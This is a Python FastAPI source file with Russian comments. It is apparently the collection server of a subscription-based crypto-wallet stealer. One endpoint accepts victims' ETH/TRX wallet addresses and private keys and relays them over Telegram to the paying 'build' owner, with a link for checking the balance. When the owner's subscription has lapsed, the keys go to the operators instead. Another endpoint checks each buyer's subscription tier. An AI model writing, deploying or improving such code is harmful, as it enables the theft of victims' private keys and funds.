import arrow
from fastapi import FastAPI
import re

import config
from dbworker import get_build_by_build_id, get_user
from dispatcher import bot
from utils.utils import send_admins

app = FastAPI(docs_url=None, redoc_url=None)


@app.get("/{build_id}/")
async def root(build_id):
    build = await get_build_by_build_id(build_id)
    if not build:
        return "error"
    user = await get_user(build.tgid)
    if not user:
        return "error"

    timesub = arrow.get(user.subuntil)
    protimesub = arrow.get(user.prosubuntil)
    timenow = arrow.now("Europe/Moscow")

    if protimesub > timenow:
        return "pro"
    elif timesub > timenow:
        return "simple"
    else:
        return "error"

# Функция для определения типа кошелька (только ETH и TRX)
def determine_wallet_type(address):
    if re.match(r"^0x[a-fA-F0-9]{40}$", address):
        return "ETH"
    elif re.match(r"^T[A-Za-z1-9]{33}$", address):
        return "TRX"
    else:
        return None

# Функция для получения ссылки на блокчейн-сканер
def get_block_explorer_link(address, coin_type):
    if coin_type == "ETH":
        return f"https://etherscan.io/address/{address}"
    elif coin_type == "TRX":
        return f"https://tronscan.org/#/address/{address}"
    else:
        return None

@app.get("/{build_id}/add")
async def root(build_id: str, address: str, private: str):
    build = await get_build_by_build_id(build_id)
    if not build:
        return "ok"
    
    user = await get_user(build.tgid)
    if not user:
        await send_admins(bot, f"<b>Кошелек от {build.tgid}:</b>\n{address}\n{private}")
        return "ok"

    timesub = arrow.get(user.subuntil)
    protimesub = arrow.get(user.prosubuntil)
    timenow = arrow.now("Europe/Moscow")

    # Определяем тип кошелька и ссылку на explorer
    coin_type = determine_wallet_type(address)
    explorer_link = get_block_explorer_link(address, coin_type)

    # Проверяем подписку и отправляем сообщение с информацией о кошельке
    if protimesub > timenow or timesub > timenow:
        if explorer_link:
            await bot.send_message(
                build.tgid,
                f"🚨 <b>Новый кошелек!</b>\n\n"
                f"💼 <b>Адрес:</b>\n<code>{address}</code>\n"
                f"🔑 <b>Приватный ключ:</b>\n<code>{private}</code>\n"
                f"🔗 <a href='{explorer_link}'>Посмотреть баланс на {coin_type} Explorer</a>",
                disable_web_page_preview=True
            )
        else:
            await bot.send_message(
                build.tgid,
                f"🚨 <b>Новый кошелек!</b>\n\n"
                f"💼 <b>Адрес:</b>\n<code>{address}</code>\n"
                f"🔑 <b>Приватный ключ:</b>\n<code>{private}</code>",
                disable_web_page_preview=True
            )
    else:
        # Если подписка не активна, уведомляем администраторов
        await send_admins(bot, f"<b>Кошелек от {build.tgid}:</b>\n\n{address}\n{private}")
    
    return "ok"